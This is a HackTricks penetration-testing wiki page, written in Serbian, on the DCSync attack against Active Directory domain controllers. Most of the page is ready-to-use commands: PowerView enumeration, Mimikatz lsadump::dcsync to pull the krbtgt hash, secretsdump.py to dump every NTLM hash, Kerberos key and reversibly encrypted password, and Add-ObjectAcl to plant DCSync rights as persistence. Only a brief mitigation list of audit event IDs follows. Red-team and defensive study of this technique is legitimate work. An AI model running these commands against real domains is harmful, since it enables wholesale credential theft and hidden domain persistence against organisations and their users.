# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## DCSync

Dozvola **DCSync** podrazumeva posedovanje ovih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.

**Važne napomene o DCSync:**

* **DCSync napad simulira ponašanje Kontrolera domena i traži od drugih Kontrolera domena da repliciraju informacije** koristeći Protokol za daljinsku replikaciju direktorijuma (MS-DRSR). Pošto je MS-DRSR validna i neophodna funkcija Active Directory-a, ne može se isključiti ili onemogućiti.
* Po defaultu, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
* Ako su lozinke bilo kojih naloga sačuvane sa reverzibilnom enkripcijom, dostupna je opcija u Mimikatz-u da vrati lozinku u čistom tekstu.

### Enumeracija

Proverite ko ima ove dozvole koristeći `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Iskoristi lokalno
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatiši na daljinu
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiše 3 datoteke:

* jedna sa **NTLM hešovima**
* jedna sa **Kerberos ključevima**
* jedna sa lozinkama u čistom tekstu iz NTDS za bilo koje naloge postavljene sa [**reverzibilnom enkripcijom**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) omogućenom. Možete dobiti korisnike sa reverzibilnom enkripcijom pomoću

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencija

Ako ste administrator domena, možete dodeliti ove dozvole bilo kojem korisniku uz pomoć `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Zatim, možete **proveriti da li je korisniku ispravno dodeljeno** 3 privilegije tražeći ih u izlazu (trebalo bi da možete da vidite imena privilegija unutar polja "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

* Security Event ID 4662 (Audit Policy for object must be enabled) – Operacija je izvršena na objektu
* Security Event ID 5136 (Audit Policy for object must be enabled) – Objekt usluge direktorijuma je izmenjen
* Security Event ID 4670 (Audit Policy for object must be enabled) – Dozvole na objektu su promenjene
* AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
